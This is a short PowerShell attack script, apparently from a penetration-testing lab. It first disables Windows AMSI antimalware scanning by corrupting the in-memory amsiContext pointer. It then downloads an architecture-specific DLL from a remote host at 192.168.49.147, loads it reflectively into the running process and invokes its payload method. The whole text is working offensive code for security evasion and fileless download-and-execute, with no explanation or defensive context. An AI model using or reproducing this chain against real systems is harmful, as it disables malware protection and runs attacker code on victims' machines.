# 1. Memory-resident AMSI Bypass via Context Structure Corruption
$a=[Ref].Assembly.GetTypes();
Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}};
$d=$c.GetFields('NonPublic,Static');
Foreach($e in $d) {if ($e.Name -like "*Context") {$f=$e}};
$g=$f.GetValue($null);
[IntPtr]$ptr=$g;
[Int32[]]$buf = @(0);
[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1);

# 2. Architecture Check: Select the correct DLL
if ([Environment]::Is64BitProcess) {
    $dllName = "HollowDLLx64.dll"
} else {
    $dllName = "HollowDLLx86.dll"
}

# 3. Download the specific DLL as a byte array
$baseUrl = "http://192.168.49.147/"
$data = (New-Object System.Net.WebClient).DownloadData($baseUrl + $dllName);

# 4. Load the assembly reflectively into the current process
$assem = [System.Reflection.Assembly]::Load($data);

# 5. Identify the class and the method to execute (Namespace.Class)
$class = $assem.GetType("HollowPayload.Runner");
$method = $class.GetMethod("Execute");

# 6. Invoke the method
$method.Invoke($null, $null);
